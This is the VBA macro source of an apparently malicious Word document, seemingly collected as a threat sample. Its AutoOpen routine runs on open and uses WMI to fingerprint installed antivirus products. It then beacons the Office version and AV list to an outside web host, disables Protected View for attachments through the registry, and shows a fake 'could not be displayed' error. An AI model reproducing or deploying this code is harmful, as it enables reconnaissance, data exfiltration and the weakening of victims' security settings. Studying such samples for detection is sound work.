Attribute VB_Name = "NewMacros"
Function retrieveProcessesList(objWMIService, strComputer, ByRef lstProcesses, ByRef strSysExplanation)
    retrieveProcessesList = False
    Set lstProcesses = Nothing
    On Error Resume Next
    Set lstProcesses = objWMIService.ExecQuery("Select * from Win32_Process")
    If (Err.Number <> 0) Then
        Exit Function
    End If
    If (lstProcesses.Count <= 0) Then
        Exit Function
    End If
    On Error GoTo 0
    retrieveProcessesList = True
End Function

Function retrieveServicesList(objWMIService, strComputer, ByRef lstServices, ByRef strSysExplanation)
    retrieveServicesList = False
    Set lstServices = Nothing
    On Error Resume Next
    Set lstServices = objWMIService.ExecQuery("Select * from Win32_Service WHERE state = ""Running""")
    If (Err.Number <> 0) Then
         Exit Function
    End If
    If (lstServices.Count <= 0) Then
         Exit Function
    End If
    retrieveServicesList = True
End Function

Function isProcessRunning(ByRef lstProcesses, ByRef strExplanation)
    On Error Resume Next
    Dim objProcess
    isProcessRunning = ""
     For Each objProcess In lstProcesses
        If (Err.Number <> 0) Then
            Exit Function
        End If
 
        isProcessRunning = isProcessRunning + LCase(objProcess.Name) + " "
    Next
End Function

Function isServiceRunning(ByRef lstServices, strServiceDescription, ByRef strExplanation)
    On Error Resume Next
    Dim objService
    isServiceRunning = ""
    For Each objService In lstServices
        If (Err.Number <> 0) Then
             Exit Function
        End If
        isServiceRunning = isServiceRunning + LCase(objService.Name) + " "
    Next
End Function

Function getWMIObject(strComputer, strCredentials, ByRef objWMIService, ByRef strSysExplanation)
    On Error Resume Next
    Dim objNMServerCredentials, objSWbemLocator, colItems
    Dim strUsername, strPassword
    getWMIObject = False
    Set objWMIService = Nothing
    Set objWMIService = GetObject("winmgmts:{impersonationLevel=Impersonate}!\\" & strComputer & "\root\cimv2")
    If (Err.Number <> 0) Then
        objWMIService = Nothing
        getWMIObject = False
        Exit Function
    End If
    getWMIObject = True
End Function

Function CheckAntiVirusScan(strComputer, strCredentials)
    Dim objWMIService
    Dim SYSDATA
    Dim SYSEXPLANATION
    CheckAntiVirusScan = "unkown"
    SYSDATA = ""
    SYSEXPLANATION = ""
    If (Not getWMIObject(strComputer, strCredentials, objWMIService, SYSEXPLANATION)) Then
        CheckAntiVirusScan = "error"
        Exit Function
    End If
    CheckAntiVirusScan = checkAntiWMI(objWMIService, strComputer, SYSEXPLANATION)
End Function
Function checkAntiWMI(objWMIService, strComputer, ByRef strExplanation)
    Dim lstProcesses, lstServices, result
    checkAntiWMI = "unkown"
    result = False
    If (Not retrieveProcessesList(objWMIService, strComputer, lstProcesses, strExplanation)) Then
       checkAntiWMI = "error"
       Exit Function
    End If
    If (Not retrieveServicesList(objWMIService, strComputer, lstServices, strExplanation)) Then
       checkAntiWMI = "error"
       Exit Function
    End If
    checkAntiWMI = isServiceRunning(lstServices, "", strExplanation) + isProcessRunning(lstProcesses, strExplanation)
End Function
Sub AutoOpen()
Dim AntiVirusName
Dim AntiList
AntiList = ""
AntiVirusName = CheckAntiVirusScan("localhost", "")
ver = Application.Version
If InStr(AntiVirusName, " mbam") > 0 Then
AntiList = AntiList + "Malw-"
End If
If InStr(AntiVirusName, " savservice") > 0 Then
AntiList = AntiList + "soph-"
End If
If InStr(AntiVirusName, " nortonsecurity") > 0 Then
AntiList = AntiList + "nort-"
End If
If InStr(AntiVirusName, " avpui.exe") > 0 Or InStr(AntiVirusName, " avp.exe") > 0 Then
AntiList = AntiList + "kasp-"
End If
If AntiVirusName = "error" Or InStr(AntiVirusName, " windefend") > 0 Then
AntiList = AntiList + "defe-"
End If
If InStr(AntiVirusName, " ntrtscan") > 0 Then
AntiList = AntiList + "tren-"
End If
If InStr(AntiVirusName, " tmrhea") > 0 Then
AntiList = AntiList + "tren-"
End If
If InStr(AntiVirusName, " tmwscsvc") > 0 Then
AntiList = AntiList + "tren-"
End If
If InStr(AntiVirusName, " coreserviceshell") > 0 Then
AntiList = AntiList + "tren-"
End If
If InStr(AntiVirusName, " scs.exe") > 0 Then
AntiList = AntiList + "SymC-"
End If
If InStr(AntiVirusName, " wrsa.exe") > 0 Then
AntiList = AntiList + "webr-"
End If
If InStr(AntiVirusName, " mcshield") > 0 Then
AntiList = AntiList + "MCaf-"
End If
If InStr(AntiVirusName, " avastui") > 0 Then
AntiList = AntiList + "avas-"
End If
If InStr(AntiVirusName, " ccsvchst") > 0 Then
AntiList = AntiList + "Syma-"
End If
If InStr(AntiVirusName, " ekrn.exe") > 0 Then
AntiList = AntiList + "ESET-"
End If
If InStr(AntiVirusName, " msseces.exe") > 0 Then
AntiList = AntiList + "esse-"
End If
If InStr(AntiVirusName, " avgui.exe") > 0 Then
AntiList = AntiList + "avg-"
End If
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set wShell = CreateObject("WScript.Shell")
Set Post0 = CreateObject("msxml2.xmlhttp")
Post0.Open "GET", "https://jonashartley.com/hilaryolsen/wp-includes/random_compat/1122/res.php?op=" + ver + AntiList, False
Post0.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
Post0.Send
'retu = wShell.Run("explorer.exe https://drive.google.com/file/d/1M9jDgLRvfjrBRIlHRJf8ZB3aVgB89avI/view", 0, True)
folder = wShell.ExpandEnvironmentStrings("%appdata%")
file_bat = folder + "\tmp0.bat"


retu = wShell.Run("reg add ""HKCU\Software\Microsoft\Office\14.0\Word\Security\ProtectedView"" /v DisableAttachementsInPV /t REG_DWORD /d ""1"" /f", 0, True)
MsgBox "This document could not be displayed.", vbCritical, "Something went wrong."
End Sub


Attribute VB_Name = "ThisDocument"
Attribute VB_Base = "1Normal.ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = True
Attribute VB_Customizable = True


INQUEST-PP=macro
